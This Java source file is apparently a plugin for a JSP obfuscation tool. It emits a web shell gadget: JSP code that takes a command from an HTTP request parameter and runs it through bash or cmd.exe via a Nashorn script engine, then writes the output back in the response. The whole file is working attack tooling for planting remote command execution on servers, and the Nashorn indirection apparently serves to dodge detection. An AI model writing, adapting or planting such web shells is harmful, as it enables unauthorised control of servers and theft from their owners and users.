package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import org.apache.commons.text.StringSubstitutor;
import org.pf4j.Extension;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Extension
public class ScriptEngine implements GadgetExtension {
  private final String COMMAND_PARAMETER = "CommandParameter";
  private final String SYSTEM = "System";
  private final String[] SYSTEM_OPTIONS = {"Linux", "Windows"};

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput(COMMAND_PARAMETER, true, "cmd");
    ctx.registerSelectInput(SYSTEM, List.of(SYSTEM_OPTIONS), true, 0);
  }

  @Override
  public List<String> getCode(ExtensionContext ctx) {
    String cmdParameter = ctx.getStringInput(COMMAND_PARAMETER);
    int system = ctx.getSelectInput(SYSTEM);
    String arg0, arg1;
    switch (SYSTEM_OPTIONS[system]) {
      case "Linux" -> {
        arg0 = "/bin/bash";
        arg1 = "-c";
      }
      case "Windows" -> {
        arg0 = "cmd.exe";
        arg1 = "/c";
      }
      default -> throw new IllegalArgumentException("Unknown system: " + SYSTEM_OPTIONS[system]);
    }
    Map<String, String> valuesMap = new HashMap<>();
    valuesMap.put("arg0", arg0);
    valuesMap.put("arg1", arg1);
    valuesMap.put("cmdParameter", cmdParameter);
    StringSubstitutor sub = new StringSubstitutor(valuesMap);

    String tempString =
"""
String s = "s=[3];s[0]='${arg0}';s[1]='${arg1}';s[2]='" + request.getParameter("${cmdParameter}") + "';java.lang.Runtime.getRuntime().exec(s);";
Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s);
StringBuilder stringBuilder = new StringBuilder();
BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
String line;
while((line = bufferedReader.readLine()) != null) {
    stringBuilder.append(line).append("\\n");
}
response.getOutputStream().write(stringBuilder.toString().getBytes());
""";
    return List.of(sub.replace(tempString));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of("javax.script.ScriptEngineManager", "java.io.*");
  }
}
